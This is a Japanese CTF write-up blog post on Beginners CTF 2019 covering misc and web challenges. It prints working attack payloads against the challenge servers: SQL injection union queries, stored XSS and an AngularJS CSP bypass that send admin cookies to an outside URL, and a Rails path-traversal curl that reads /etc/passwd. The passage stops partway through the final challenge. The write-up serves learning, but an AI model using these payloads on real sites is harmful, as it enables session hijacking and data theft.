---
layout: post
title: Beginners CTF 2019 の write-up
categories: [ctf]
date: 2019-05-26 15:00:00 +0900
---

5 月 25 日から 5 月 26 日にかけて開催された [Beginners CTF 2019](https://2018.seccon.jp/2019/05/2nd-seccon-beginners-ctf.html) に、チーム zer0pts として参加しました。最終的にチームで 5477 点を獲得し、順位は得点 666 チーム中 1 位でした。うち、私は 9 問を解いて 2295 点を入れました。

以下、私が解いた問題の write-up です。

## Misc
### containers (71)
> Let's extract files from the container. 
> 
> 添付ファイル: e35860e49ca3fa367e456207ebc9ff2f_containers

とりあえず与えられたファイルをバイナリエディタで開いてみると、`43 4F 4E 54 41 49 4E 45 52 2E 46 49 4C 45 30 2E` (`CONTAINER.FILE0.`) というマジックナンバーと思われるバイト列の次に PNG ファイルが続いていました。PNG ファイルの終わりを示す `IEND` チャンクのあとには `46 49 4C 45 31 2E` (`FILE1.`) というバイト列が続いており、さらにその後ろにまた別の PNG ファイルが続いています。

このような形式で PNG ファイルが 39 個続いたあと、`FILE(数値).` の代わりに `VALIDATOR.` という区切り文字? が続き、さらにその後ろに以下のような Python コードが埋め込まれていました。

```python
import hashlib
print('Valid flag.' if hashlib.sha1(input('Please your flag:').encode('utf-8')).hexdigest()=='3c90b7f38d3c200d8e6312fbea35668bec61d282' else 'wrong.'.ENDCONTAINER
```

これで手に入れたフラグが正しいものかチェックしろということでしょうか。

試しに PNG ファイルをいくつかバイナリエディタで切り出してみると、`FILE0` から順にそれぞれ `c` `t` `f` `4` `b` `{` という文字が書かれている画像であることがわかります。[binwalk](https://github.com/ReFirmLabs/binwalk) というツールを使ってすべての PNG ファイルを切り出しましょう。

```
$ binwalk -D "png image:png" -e e35860e49ca3fa367e456207ebc9ff2f_containers

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
16            0x10            PNG image, 128 x 128, 8-bit/color RGBA, non-interlaced
107           0x6B            Zlib compressed data, compressed
738           0x2E2           PNG image, 128 x 128, 8-bit/color RGBA, non-interlaced
829           0x33D           Zlib compressed data, compressed
1334          0x536           PNG image, 128 x 128, 8-bit/color RGBA, non-interlaced
1425          0x591           Zlib compressed data, compressed
1914          0x77A           PNG image, 128 x 128, 8-bit/color RGBA, non-interlaced
2005          0x7D5           Zlib compressed data, compressed
2856          0xB28           PNG image, 128 x 128, 8-bit/color RGBA, non-interlaced
2947          0xB83           Zlib compressed data, compressed
3666          0xE52           PNG image, 128 x 128, 8-bit/color RGBA, non-interlaced
3757          0xEAD           Zlib compressed data, compressed
︙
31524         0x7B24          PNG image, 128 x 128, 8-bit/color RGBA, non-interlaced
31615         0x7B7F          Zlib compressed data, compressed
```

さらに、これらのファイルの幅と高さがすべて同じであることを利用しながら、[Pillow](https://pillow.readthedocs.io/en/stable/) という画像処理ライブラリを使って結合します。

```python
# coding: utf-8
import glob
import re
from PIL import Image # https://pillow.readthedocs.io/en/stable/

files = glob.glob('*/*.png') # ファイルは 1A42.png のように (オフセット).png というファイル名で出力されているので
files.sort(key=lambda file: int(re.findall(r'([0-9A-F]+)\.png', file)[0], 16)) # 切り出されたオフセットでソート

# 適当な PNG ファイルを開いて幅と高さを取得
im_test = Image.open(files[0])
w, h = im_test.size

# 左から結合していく
im = Image.new('RGB', (w * len(files), h))
for i, file in enumerate(files):
  tmp = Image.open(file)
  im.paste(tmp, (i * w, 0))

im.save('result.png')
print('done')
```

```
$ python3 concat.py
done
```

出力された画像は以下のようなものでした。

![2019-05-26_1.png](../images/2019-05-26_1.png)

フラグが得られました。

```
ctf4b{e52df60c058746a66e4ac4f34db6fc81}
```

### Dump (138)
> Analyze dump and extract the flag!!
> 
> 添付ファイル: fc23f13bcf6562e540ed81d1f47710af_dump

`file` コマンドでどのようなファイルか確認してみましょう。

```
>file fc23f13bcf6562e540ed81d1f47710af_dump
fc23f13bcf6562e540ed81d1f47710af_dump: tcpdump capture file (little-endian) - version 2.4 (Ethernet, capture length 262144)
```

tcpdump でパケットをキャプチャした結果のようです。[Wireshark](https://www.wireshark.org/) というパケット解析ツールで開いてみると、以下のような不穏な HTTP 通信が確認できました。

```
GET /webshell.php?cmd=ls%20%2Dl%20%2Fhome%2Fctf4b%2Fflag HTTP/1.1
Host: 192.168.75.230
User-Agent: curl/7.54.0
Accept: */*
```

```
HTTP/1.1 200 OK
Date: Sun, 07 Apr 2019 11:55:16 GMT
Server: Apache/2.4.18 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 130
Content-Type: text/html; charset=UTF-8

<html>
<head>
<title>Web Shell</title>
</head>
<pre>
-rw-r--r-- 1 ctf4b ctf4b 767400 Apr  7 19:46 /home/ctf4b/flag
</pre>
</html>
```

Web シェルが設置された Web サーバで OS コマンドが実行されているように見えます。攻撃者は `/home/ctf4b/flag` というファイルが存在しているか確認していたようです。この次の通信を見てみましょう。

```
GET /webshell.php?cmd=hexdump%20%2De%20%2716%2F1%20%22%2502%2E3o%20%22%20%22%5Cn%22%27%20%2Fhome%2Fctf4b%2Fflag HTTP/1.1
Host: 192.168.75.230
User-Agent: curl/7.54.0
Accept: */*
```

```
HTTP/1.1 200 OK
Date: Sun, 07 Apr 2019 11:55:27 GMT
Server: Apache/2.4.18 (Ubuntu)
Vary: Accept-Encoding
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8

<html>
<head>
<title>Web Shell</title>
</head>
<pre>
037 213 010 000 012 325 251 134 000 003 354 375 007 124 023 133
327 007 214 117 350 115 272 110 047 012 212 122 223 320 022 252
164 220 052 275 051 204 044 100 050 011 044 024 101 120 274 166
244 010 010 050 315 002 110 023 024 244 012 330 005 351 012 012
322 024 245 011 202 205 242 202 212 337 204 216 242 357 175 336
︙
376 317 360 377 046 303 050 030 005 243 140 024 214 202 121 060
012 106 301 050 030 005 243 140 024 214 202 121 060 012 106 301
050 030 005 243 140 024 214 202 121 060 012 106 301 050 030 005
243 140 024 214 202 121 060 012 106 301 050 030 005 344 000 000
050 241 022 115 000 060 014 000
</pre>
</html>
```

攻撃者が `hexdump -e '16/1 "%02.3o " "\n"' /home/ctf4b/flag` というように `hexdump` コマンドを使って `/home/ctf4b/flag` を読み出しています。`-e '16/1 "%02.3o " "\n"'` というオプションから、読み出されているファイルは「16 バイト単位で」「`\n` (LF) で改行し」「3 桁の 8 進数、3 桁に満たないときは左側を 0 で埋める」というフォーマットで出力されていることが分かります。

[NetworkMiner](https://www.netresec.com/?page=Networkminer) という別のパケット解析ツールでこの 8 進数で出力されているファイルを取り出し、Python を使って出力されているファイルをデコードしましょう。

```
$ python3
︙
>>> import re
>>> s = open('webshell.php.7F54ABBD.html', 'r').read() # エンコードされたファイルを読み出す
>>> s = re.findall(r'<pre>(.+)</pre>', s, re.DOTALL)[0] # <pre>(コマンドの実行結果)</pre> というような出力になっているので、実行結果だけを正規表現で取り出す
>>> s = s.strip().replace('\n', ' ') # 改行文字をすべて半角スペースにしてパースしやすくする
>>> s = bytes([int(c, 8) for c in s.split(' ')]) # 8 進数として処理、bytes にする
>>> s[:0x10]
b'\x1f\x8b\x08\x00\n\xd5\xa9\\\x00\x03\xec\xfd\x07T\x13['
```

デコードされたバイト列は `1f 8b` から始まっています。ググってみると、これは [gzip のマジックナンバー](https://ja.wikipedia.org/wiki/%E3%83%9E%E3%82%B8%E3%83%83%E3%82%AF%E3%83%8A%E3%83%B3%E3%83%90%E3%83%BC_(%E3%83%95%E3%82%A9%E3%83%BC%E3%83%9E%E3%83%83%E3%83%88%E8%AD%98%E5%88%A5%E5%AD%90))であることがわかります。ビルトインの [gzip モジュール](https://docs.python.org/ja/3/library/gzip.html)を使って展開しましょう。

```
>>> import gzip
>>> s = gzip.decompress(s)
>>> s[:0x100]
b'./._flag.jpg\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00000644 \x00000765 \x00000024 \x0000000000351 13452352072 013130\x00 0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
```

`flag.jpg` というそれっぽいファイル名が含まれたバイト列のようです。適当なファイル名で書き込んでみましょう。

```
>>> open('decompressed.bin', 'wb').write(s)
798720
```

`file` コマンドでどのようなファイルか確認します。

```
$ file decompressed.bin
decompressed.bin: POSIX tar archive
```

tar ファイルのようです。`tar` コマンドで展開してみましょう。

```
$ ls
decompressed.bin  webshell.php.7F54ABBD.html
$ tar -xf decompressed.bin
$ ls
decompressed.bin  flag.jpg  webshell.php.7F54ABBD.html
```

出てきた `flag.jpg` はフラグが書かれた画像でした。

```
ctf4b{hexdump_is_very_useful}
```

### Sliding puzzle (206)
> (問題サーバへの接続情報)
> 
> ---
> 
> スライドパズルを解いてください。すべてのパズルを解き終わったとき FLAG が表示されます。
> 
> スライドパズルは以下のように表示されます。
> 
> ```
> ----------------
> |  0 |  2 |  3 |
> |  6 |  7 |  1 |
> |  8 |  4 |  5 |
> ----------------
> ```
> 
> 0 はブランクで動かすことが可能です。操作方法は以下のとおりです。
> 
> 0 : 上
> 1 : 右
> 2 : 下
> 3 : 左
> 最終的に以下の形になるように操作してください。
> 
> ```
> ----------------
> |  0 |  1 |  2 |
> |  3 |  4 |  5 |
> |  6 |  7 |  8 |
> ----------------
> ```
> 
> 操作手順は以下の形式で送信してください。
> 
> 1,3,2,0, ... ,2

与えられた接続情報を使って、`nc` コマンドで問題サーバに接続してみましょう。

```
# nc (省略)
----------------
| 01 | 02 | 05 |
| 03 | 00 | 04 |
| 06 | 07 | 08 |
----------------

```

問題文とよく似た形式でスライドパズル (8 パズル) の盤面が表示されました。適当に手で解いてみると別の盤面が表示されました。

また、表示される盤面は完全にランダムで接続するごとに変わっているため、接続 → 既に解けている盤面の操作手順を一気に入力 → 解けていない盤面を取得して切断 → ローカルで解くという戦法も通用しなさそうです。

CTF ではフラグが得られれば勝ちなので、既に存在しているソルバが利用できないか調べてみましょう。`8 puzzle solver` でググってみると、[speix/8-puzzle-solver](https://github.com/speix/8-puzzle-solver) がヒットしました。これを利用して自動で解かせる Python スクリプトを書きましょう。

```python
# coding: utf-8
import re
import os
from pwn import * # https://github.com/Gallopsled/pwntools

sock = remote('(省略)', 24912)
i = 0

# 解く回数が与えられていないので、とりあえず盤面のパースに失敗してエラーが発生する (= フラグが表示される) まで続ける
while True:
  print i
  print repr(sock.recvline()) # 盤面の 1 行目はどうせ罫線なのでそのまま出力させる、ここでフラグが表示されるかもしれない

  r = sock.recvuntil('\n\n').strip()
  r = [int(x) for x in re.findall(r'\d+', r)] # 盤面を真面目にパース…しているわけではなく、数値だけを拾っている
  os.system('python 8-puzzle-solver/driver.py ast ' + ','.join(str(x) for x in r)) # 外部のソルバに丸投げ

  with open('output.txt', 'r') as f: # 8-puzzle-solver/driver.py が解いた結果は output.txt に出力される
    path = f.read().splitlines()[0].split(': ')[1] # 操作手順は path_to_goal: ['Right', 'Down', 'Down', …] のような形式なので、コロン以降を切り出す

    # 問題文の指定のとおりに操作手順を 'Up' → 0、'Right' → 1 … に置換する
    path = path.replace("'Up'", '0')
    path = path.replace("'Right'", '1')
    path = path.replace("'Down'", '2')
    path = path.replace("'Left'", '3')
    path = ','.join(str(x) for x in eval(path))

  sock.sendline(path)
  i += 1

sock.close()
```

```
$ python2 solver.py
︙
100
'[+] Congratulations! ctf4b{fe6f512c15daf77a2f93b6a5771af2f723422c72}\n'
```

100 回盤面を解けばよかったようです。フラグが得られました。

```
ctf4b{fe6f512c15daf77a2f93b6a5771af2f723422c72}
```

## Web
### [warmup] Ramen (73)
> ラーメン
> 
> https://(省略)

与えられた URL はラーメン屋の Web サイト (を模したもの) のようです。アクセスすると、「安い」「美味い」「早い」という宣伝文句と店員の一覧が表示されました。

この Web サイトではなぜかユーザ名で店員を検索できる機能も提供されています。裏でユーザ入力をそのまま結合した SQL 文を DB に渡しているのではないかと考え、`' or 1=1;#` を入力するとすべての店員が表示されました。また、`' and 1=0;#` を入力すると店員はひとりも表示されませんでした。SQL インジェクションができるようです。

DB の種類を特定できないか、とりあえず MySQL や PostgreSQL に存在している `version()` という関数を実行させてみて、その結果を `union` 文で出力させてみましょう。`' union select 1, version();#` を入力すると、以下のようなテーブルが表示されました。

|名前|一言|
|----|----|
|せくこん太郎|1970 年よりラーメン道一本。美味しいラメーンを作ることが生きがい。|
|せくこん次郎|せくこん太郎の弟。好きな食べものはコッペパン。|
|せくこん三郎|せくこん次郎の弟。食材本来の味を引き出すことに全力を注ぐ。|
|1|5.6.44|

ラメーン。`5.6.44` でググると MySQL がヒットします。どうやら DB には MySQL が使われているようです。

MySQL では [`information_schema.columns`](https://dev.mysql.com/doc/refman/5.6/ja/columns-table.html) というテーブルからカラム名とテーブル名を抜き出すことができます。`' union select concat(table_schema, '.', table_name), column_name from information_schema.columns;#` を試してみると、以下のようなテーブルが表示されました。

|名前|一言|
|----|----|
|せくこん太郎|1970 年よりラーメン道一本。美味しいラメーンを作ることが生きがい。|
|せくこん次郎|せくこん太郎の弟。好きな食べものはコッペパン。|
|せくこん三郎|せくこん次郎の弟。食材本来の味を引き出すことに全力を注ぐ。|
|(省略)|(省略)|
|app.flag|flag|
|app.members|username|
|app.members|profile|

`app.flag` というテーブルに `flag` というカラムが存在するようです。`' union select 1, flag from app.flag;#` で読み出してみましょう。

|名前|一言|
|----|----|
|せくこん太郎|1970 年よりラーメン道一本。美味しいラメーンを作ることが生きがい。|
|せくこん次郎|せくこん太郎の弟。好きな食べものはコッペパン。|
|せくこん三郎|せくこん次郎の弟。食材本来の味を引き出すことに全力を注ぐ。|
|1|ctf4b{a_simple_sql_injection_with_union_select}|

フラグが得られました。

```
ctf4b{a_simple_sql_injection_with_union_select}
```

### katsudon (101)
> Rails 5.2.1で作られたサイトです｡
> 
> https://(省略)
> 
> クーポンコードを復号するコードは以下の通りですが､まだ実装されてないようです｡
> 
> フラグは以下にあります｡ https://(省略)/flag
> 
> ```ruby
> # app/controllers/coupon_controller.rb
> class CouponController < ApplicationController
> def index
> end
> 
> def show
>   serial_code = params[:serial_code]
>   @coupon_id = Rails.application.message_verifier(:coupon).verify(serial_code)
>   end
> end
> ```

https://(省略)/flag にアクセスしてみると、以下のような文字列が表示されました。

```
BAhJIiVjdGY0YntLMzNQX1kwVVJfNTNDUjM3X0szWV9CNDUzfQY6BkVU--0def7fcd357f759fe8da819edd081a3a73b6052a
```

`BAhJIiVjdGY0YntLMzNQX1kwVVJfNTNDUjM3X0szWV9CNDUzfQY6BkVU` を Base64 デコードしてみましょう。

```
>python2
︙
>>> 'BAhJIiVjdGY0YntLMzNQX1kwVVJfNTNDUjM3X0szWV9CNDUzfQY6BkVU'.decode('base64')
'\x04\x08I"%ctf4b{K33P_Y0UR_53CR37_K3Y_B453}\x06:\x06ET'
```

フラグが得られました。

```
ctf4b{K33P_Y0UR_53CR37_K3Y_B453}
```

### Himitsu (379)
> 抱え込まないでくださいね。 
> 
> https://(省略)
> 
> 添付ファイル: c8568442c06826ed8bba5695a0ca2ea3_himitsu.zip (ソースコード)

ソースコードを展開してどのようなファイルがあるか眺めていると、`part_of_crawler.js` というファイルが見つかりました。これには [puppeteer](https://github.com/GoogleChrome/puppeteer) を使ってユーザが投稿した URL にアクセスするような処理が書かれており、おそらくこの問題では XSS や CSRF のようなクライアントサイドの脆弱性を使うであろうことが推測できます。

#### XSS はできない?
与えられた URL にアクセスすると、ユーザ名とパスワードを入力するログインフォームと、ユーザ登録ができるページへのリンクが表示されました。

適当なユーザ名とパスワードで登録しログインすると、記事が投稿できるページへのリンクが表示されました。記事は以下のような記法で書くことができるようです。

```
[#記事ID#]
ページのタイトルを埋め込むことができます。例: [#a42a78de275ae00e31d337bd6bd75150#]

[*任意の文字列*]
太字で表示できます。例: [*太字で表示したい文字列*]

[-任意の文字列-]
取り消し線を引くことができます。例: [-取り消したい文字列-]

[=任意の文字列=]
イタリック体で表示できます。例: [=イタリック体にしたい文字列=]

# から始まる行
タイトル行として表示できます。# は h1, ## は h2, …… というように、# の数に応じて見出しレベルが変わります。
```

試しにタイトル、概要、本文をすべて `<s>test</s>` にして投稿してみますが、`<` は `&lt;` に、`>` は `&gt;` に変換されており、どうやら単純な XSS はできないようです。ちなみにこの記事の ID は `f118c83c56210538cc8bf2d3a2e847d3` で、フォーマットは `0123456789abcdef` の 16 種類の文字のみが含まれる 32 文字の文字列のようでした。

なぜ XSS できないか探ってみましょう。ソースコードの `backend/templates/article.twig` (記事の閲覧ページのテンプレート) は以下のような内容でした。

```html
{% raw %}{% extends 'base.twig' %}

{% block body %}
    <div class="container">
        <div class="row justify-content-center flex-column">
            <div class="article-meta m-3">
                <h1>{{ title }}</h1>
                <p class="text-muted">{{ created_at }} by {{ username }}</p>
                <p class="text-muted">記事ID: {{ article_key }}</p>
                <p>記事の概要: {{ abstract }}</p>                
            </div>
        </div>
        {% if message is defined %}
            <div class="alert alert-success" role="alert">
                {{ message }}
            </div>
        {% endif %}
        {% if error_message is defined %}
            <div class="alert alert-danger" role="alert">
                {{ error_message }}
            </div>
        {% endif %}
        <div class="m-3">
            {{ body | raw}}
        </div>
        <hr>
        <div class="m-3">
            <h2>秘密を共有する</h2>
            <p>もし一人で秘密を抱えるのが大変であれば、ぜひ運営に共有してください。</p>
            <form action="/tell" method="POST">
                <input type="hidden" name="article_key" value="{{ article_key }}">
                <script src="//www.google.com/recaptcha/api.js" async defer></script><div class="g-recaptcha" data-sitekey="{{ site_key }}"></div>
                <button type="submit">送信する</button>
            </form>
        </div>
    </div>
{% endblock %}{% endraw %}
```

`title` (タイトル) と `abstract` (概要) についてはテンプレートエンジン側でエスケープされているようですが、`body` (本文) については HTML として生で出力されているように見えます。`body` はどのような処理がされているのでしょうか。

記事の投稿時に呼ばれる `backend/classes/ArticleController.php` の `addArticle` メソッドを見ると、以下のような処理がありました。

```php
<?php
︙
    public function addArticle(Request $request, Response $response, array $args){
︙
            // escape the given body
            $body = htmlspecialchars($data['body']);
︙
```

`htmlspecialchars` に通されています。`ENT_QUOTES` が渡されていないので `'` は実体参照に変換されませんが、`<a href='(本文)'>` のように `'` で囲まれている中に本文が展開されているわけではないので意味がありません。

#### やっぱり XSS できるのでは…?
別の記事でこの記事のタイトルを埋め込むことで XSS できないか `[#f118c83c56210538cc8bf2d3a2e847d3#]` という本文で投稿しようとしましたが、`埋め込み先の記事タイトルが不正です。` というエラーが表示され投稿できません。ソースコードでこのエラーを表示している処理を探すと、`backend/classes/ArticleController.php` の `addArticle` メソッドにありました。

```php
<?php
︙
    public function addArticle(Request $request, Response $response, array $args){
︙
            // here we should only validate and shouldn't replace; [# ... #] should be replaced here because the title can be changed :-)
            preg_match_all('/\[#(.*?)#\]/', $body, $matches);
            foreach(range(0, count($matches)-1) as $i){
                $found_article_key = $matches[1][$i];
                $found_article = $mapper->getArticle($found_article_key);
                if (preg_match('/[<>"\']/', $found_article['title'])){
                    return $this->app->renderer->render($response, 'new.twig', [
                        'error_message' => '埋め込み先の記事タイトルが不正です。',
                        'title' => $data['title'],
                        'abstract' => $data['abstract'],
                        'body' => $data['body'],
                        'token' => $this->get_csrf_token($request)                        
                    ]);
                }
            }
︙
```

`<` `>` `"` `'` のいずれかの文字が含まれていれば、その時点で処理を中断してしまうようです。ところで、`[*任意の文字列*]` のようなタグではどのようにして処理しているのでしょうか。この処理の後ろの方で、同じメソッド内で処理がされていました。

```php
<?php
︙
            preg_match_all('/\[\*(.*?)\*\]/', $body, $matches);
            foreach(range(0, count($matches)-1) as $i){
                $found_body = $matches[1][$i];
                $expanded = "<b>$found_body</b>";
                $body = str_replace($matches[0][$i], $expanded, $body);
            }
︙
```

記事タイトルを埋め込むタグの処理では `str_replace` (= HTML タグへの置換処理) まではされていませんでした。では、記事タイトルを埋め込むタグの HTML タグへの置換処理はどこでされているのでしょう。探していると、`backend/src/routes.php` の `$app->get('/articles/{article_key}', ArticleController::class . ':getArticle');` から、先ほどと同じ `backend/classes/ArticleController.php` の `getArticle` メソッドでされていることがわかりました。

```php
<?php
︙
    public function getArticle(Request $request, Response $response, array $args){
︙
                preg_match_all('/\[#(.*?)#\]/', $article['body'], $matches);
                foreach(range(0, count($matches)-1) as $i){
                    $found_article_key = $matches[1][$i];
                    $found_article = $mapper->getArticle($found_article_key);
                    $expanded_article = "<a href=\"/articles/${found_article['article_key']}\">${found_article['title']}</a>";
                    $article['body'] = str_replace($matches[0][$i], $expanded_article, $article['body']);
                }
︙
```

記事の投稿時ではなく、閲覧時に記事タイトルを埋め込むタグの HTML タグへの置換処理がされているようです。また、このときには `<` `>` `"` `'` のような文字が含まれているかチェックはされておらず、また `htmlspecialchars` のような関数でエスケープもしていないようです。

ということは「投稿時には当該の記事 ID が存在しておらず」「閲覧時には当該の記事 ID が存在している」場合には XSS ができそうです。

#### どうやって XSS を実現する?
ではどうやって「投稿時には当該の記事 ID が存在しておらず」「閲覧時には当該の記事 ID が存在している」状況を作ればよいのでしょうか。

ひとつの方法として考えるのは、記事 ID を予測するというものです。あらかじめ次に投稿される記事 ID を予測して、

1. `[#(次の記事 ID)#]` という本文の記事を投稿
2. `<script>/* いろいろ */</script>` というタイトルの記事を投稿

ということができれば前者で XSS ができそうです。

記事 ID がどのように生成されているかソースコードを調べてみると、`backend/classes/ArticleMapper.php` の `createArticle` というメソッドに以下のような処理が見つかりました。

```php
<?php
︙
    public function createArticle($username, $title, $abstract, $body) {
        $created_at = date("Y/m/d H:i");
        $article_key = md5($username . $created_at . $title);
︙
```

記事 ID はユーザ名、投稿時の時刻 (分単位)、記事のタイトルから生成されているようです。これなら予測できそうです。

#### 解く
`guess.php` というファイルに以下のような内容を書き込みます。

```php
<?php
date_default_timezone_set('Asia/Tokyo');
$username = 'nekoneko';
$code = '<script>(new Image).src="http://(URL)?"+document.cookie</script>';
$article_key = md5($username . date("Y/m/d H:i") . $code);
echo "[#${article_key}#]";
```

`php guess.php` で出てきたタグを本文にして記事を投稿し、その次に `<script>…</script>` というコードをタイトルにして投稿します。

前者の記事にアクセスすると、`http://(URL)?PHPSESSID=…` のようなリクエストが発生しました。この記事を運営に連絡すると運営にこの XSS を踏ませることができ、admin の `PHPSESSID` (セッション ID) を得ることができました。

得られたセッション ID を Cookie にセットし、記事一覧から `flag` というタイトルの記事を見るとフラグが得られました。

```
ctf4b{simple_xss_just_do_it_haha_haha}
```

### Secure Meyasubako (433)
> みなさまからのご意見をお待ちしています。
> 
> https://(省略)

与えられた URL にアクセスすると、この CTF への意見を投稿できるフォームへのリンクが表示されました。

適当に `<s>test</s>` という意見を投げると、その意見の詳細ページでそのまま HTML として出力され XSS ができる…ように見えますが、`<script>alert(1)</script>` を投げてもアラートが出てきません。なぜでしょう。

意見の詳細ページで発行される HTTP レスポンスヘッダを見てみましょう。

```
X-XSS-Protection: 0
```

`X-XSS-Protection` という HTTP レスポンスヘッダが発行されています。これは XSS Auditor (Reflected XSS を検知し抑制する Web ブラウザのセキュリティ機構) を有効化するか無効化するか設定できるヘッダですが、今回は値が `0` なので無効化されており、XSS Auditor のことを気にする必要はなさそうです。

```
Content-Security-Policy: script-src 'self' www.google.com www.gstatic.com stackpath.bootstrapcdn.com code.jquery.com cdnjs.cloudflare.com
```

`Content-Security-Policy` という HTTP レスポンスヘッダが発行されています。これは [Content Security Policy (CSP)](https://developer.mozilla.org/ja/docs/Web/HTTP/CSP) と呼ばれる Web ブラウザのセキュリティ機構で、これを HTTP レスポンスヘッダ等によって設定することで、読み込まれるリソースや実行されるスクリプトなどに制限をかけることができます。

今回は `script-src 'self' www.google.com www.gstatic.com stackpath.bootstrapcdn.com code.jquery.com cdnjs.cloudflare.com` と、`script-src` ディレクティブによって実行されるスクリプトの制限がされており、`'self'` (この Web アプリケーションと同じオリジン) や `www.google.com` 等の指定されているドメイン下にあるスクリプトのみが実行できるようになっています。

[CSP Evaluator](https://csp-evaluator.withgoogle.com/) という、ある CSP がセキュアかどうかチェックしてくれるツールがあるので投げてみましょう。結果は以下のとおりです。

```
cdnjs.cloudflare.com: cdnjs.cloudflare.com is known to host Angular libraries which allow to bypass this CSP.
```

`cdnjs.cloudflare.com` は [AngularJS](https://angularjs.org/) をホストしており、このため CSP をバイパスできてしまうようです。どういうことでしょうか。

`angular csp bypass` 等のキーワードでググってみると、[H5SC Minichallenge 3](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it's-CSP!%22) の記事がヒットしました。[191 バイトの解法](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it's-CSP!%22#191-bytes)の、AngularJS と [Prototype](http://prototypejs.org/) をあわせてロードし、`Function.prototype.curry` を読んだ結果からグローバルオブジェクトを手に入れるという手法を利用しましょう。

以下のような内容で意見を投稿します。

```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<div ng-app ng-csp>{% raw %}{{$on.curry.call().location.replace('http://(URL)?'+($on.curry.call().document.cookie))}}{% endraw %}</div>
```

この意見を管理者に届けると、フラグが得られました。

```
ctf4b{MEOW_MEOW_MEOW_NO_MORE_WHITELIST_MEOW}
```

### katsudon-okawari (469)
> クーポンの管理画面なんだよな...
> 
> https://(省略)/  
> https://(省略)/flag

<blockquote class="twitter-tweet" data-lang="ja"><p lang="ja" dir="ltr">katsudonについて､問題にミスがあることが判明いたしました。修正版をkatsudon-okawariとして追加致しました。この度は申し訳ありませんでした。 <a href="https://twitter.com/hashtag/ctf4b?src=hash&amp;ref_src=twsrc%5Etfw">#ctf4b</a> <a href="https://twitter.com/hashtag/seccon?src=hash&amp;ref_src=twsrc%5Etfw">#seccon</a></p>&mdash; SECCON Beginners (@ctf4b) <a href="https://twitter.com/ctf4b/status/1132272479114747904?ref_src=twsrc%5Etfw">2019年5月25日</a></blockquote>
<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

ということで、katsudon に存在したミスを修正したバージョンのようです。試しに `/flag` にアクセスしてみましょう。

```
bQIDwzfjtZdvWLH+HD5jhhZW4917cFKbx7LDRPzsL3JXqQ8VJp5RYfKIw5xqe/xhLg==--cUS9fQetfBC8wsV7--E8vQbRF4vHovYlPFvH3UnQ==
```

今度は `bQIDwzfjtZdvWLH+HD5jhhZW4917cFKbx7LDRPzsL3JXqQ8VJp5RYfKIw5xqe/xhLg==` を Base64 デコードしてもフラグが表示されません。

---

さて、この Web アプリケーションには `/flag` のほかに `/storelists` と `/coupon` の 2 つのコンテンツがありますが、いずれもフォーム等は存在せず、ユーザ入力ができる箇所はないようです。

ここで katsudon の問題文をもう一度見てみましょう。

> Rails 5.2.1で作られたサイトです｡

Ruby on Rails の最新版は 5.2.3 であり、[5.2.1 は 2018 年の 8 月にリリースされた古いバージョン](https://weblog.rubyonrails.org/2018/8/7/Rails-5-2-1-has-been-released/)です。これほど古いバージョンが使われるのは (作問者の怠惰でなければ) 何か意味があるはずです。

`rails 5.2.1 脆弱性` というキーワードでググってみると、[Rails 4, 5, 6における Security Fix について - ペパボテックブログ](https://tech.pepabo.com/2019/03/18/analysis-rails-vulnerabilities/)という記事がヒットしました。このバージョンの Rails ではパストラバーサルができるようです。

記事中のコマンドを改変して、この問題でも `/etc/passwd` が読めないか試してみましょう。

```
$ curl https://(省略)/storelists -H 'Accept: ../../../../../../etc/passwd{% raw %}{{{% endraw %}'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/bin/false
miku:x:1000:1000::/home/miku:
```

読めました。katsudon の問題文にある `app/controllers/coupon_controller.rb` がなにか変わっていないか読んでみましょう。

```
$ curl https://(省略)/storelists -H 'Accept: ../../../app/controllers/coupon_controller.rb{% raw %}{{{% endraw %}'
class CouponController < ApplicationController
